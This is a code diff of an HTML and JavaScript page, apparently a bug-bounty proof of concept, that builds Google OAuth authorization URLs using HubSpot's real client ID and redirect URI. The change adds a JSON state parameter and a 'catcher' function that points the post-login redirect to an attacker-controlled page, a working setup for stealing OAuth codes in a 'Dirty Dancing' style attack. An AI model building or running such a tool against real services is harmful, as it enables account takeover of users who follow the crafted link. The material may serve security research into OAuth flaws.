@@ -2,16 +2,16 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>OAuth PoC Builder</title>
+  <title>OAuth PoC Builder (Advanced)</title>
   <style>
     body { font-family: Arial; padding: 20px; }
-    input, select { display: block; margin-bottom: 10px; width: 400px; padding: 5px; }
-    button { padding: 10px 15px; }
+    input, textarea { display: block; margin-bottom: 10px; width: 500px; padding: 6px; }
+    button { padding: 10px 15px; margin-right: 10px; }
   </style>
 </head>
 <body>
 
-<h2>OAuth Request Builder (Dirty Dancing PoC)</h2>
+<h2>OAuth PoC Builder (HubSpot State-Aware)</h2>
 
 <label>Client ID</label>
 <input id="client_id" value="466680526474.apps.googleusercontent.com">
@@ -20,23 +20,42 @@
 <input id="redirect_uri" value="https://app.hubspot.com/login/googleLoginRedirect">
 
 <label>Response Type</label>
-<input id="response_type" value="code id_token">
+<input id="response_type" value="code">
 
 <label>Scope</label>
 <input id="scope" value="email profile">
 
 <label>Prompt</label>
-<input id="prompt" placeholder="none / consent / select_account">
+<input id="prompt" value="consent">
 
-<label>State</label>
-<input id="state" placeholder="ATTACK or URL">
+<h3>State (JSON)</h3>
+<textarea id="state_json" rows="6">
+{
+  "client": "HUBSPOT",
+  "rememberLogin": false,
+  "loginPortalId": 51254409,
+  "loginRedirectUrl": "https://app.hubspot.com/myaccounts-beta"
+}
+</textarea>
 
 <label>Nonce</label>
-<input id="nonce" placeholder="random">
+<input id="nonce" placeholder="only needed for id_token">
 
 <button onclick="launch()">Launch OAuth</button>
+<button onclick="redirectToCatcher()">Use Catcher URL</button>
 
 <script>
+function buildState() {
+  try {
+    const raw = document.getElementById("state_json").value;
+    const obj = JSON.parse(raw);
+    return encodeURIComponent(JSON.stringify(obj));
+  } catch (e) {
+    alert("Invalid JSON in state");
+    throw e;
+  }
+}
+
 function launch() {
   const params = new URLSearchParams();
 
@@ -45,7 +64,6 @@ function launch() {
   const response_type = document.getElementById("response_type").value;
   const scope = document.getElementById("scope").value;
   const prompt = document.getElementById("prompt").value;
-  const state = document.getElementById("state").value;
   const nonce = document.getElementById("nonce").value;
 
   if (client_id) params.set("client_id", client_id);
@@ -53,20 +71,33 @@ function launch() {
   if (response_type) params.set("response_type", response_type);
   if (scope) params.set("scope", scope);
   if (prompt) params.set("prompt", prompt);
-  if (state) params.set("state", state);
-  if (nonce) params.set("nonce", nonce);
 
-  // defaults for testing
-  if (!state) params.set("state", "POC_" + Math.random());
-  if (!nonce && response_type.includes("id_token")) {
-    params.set("nonce", "TEST_" + Math.random());
+  // STATE (JSON encoded)
+  const state = buildState();
+  params.set("state", state);
+
+  // NONCE if needed
+  if (response_type.includes("id_token")) {
+    params.set("nonce", nonce || "TEST_" + Math.random());
   }
 
   const url = "https://accounts.google.com/o/oauth2/auth?" + params.toString();
 
-  console.log("Redirecting to:", url);
+  console.log("OAuth URL:", url);
   window.location = url;
+}
+
+function redirectToCatcher() {
+  const catcher = "https://yourusername.github.io/catcher.html";
+
+  const stateField = document.getElementById("state_json");
+  const obj = JSON.parse(stateField.value);
+
+  obj.loginRedirectUrl = catcher;
+
+  stateField.value = JSON.stringify(obj, null, 2);
 }
 </script>
 
-</b
+</body>
+</html>
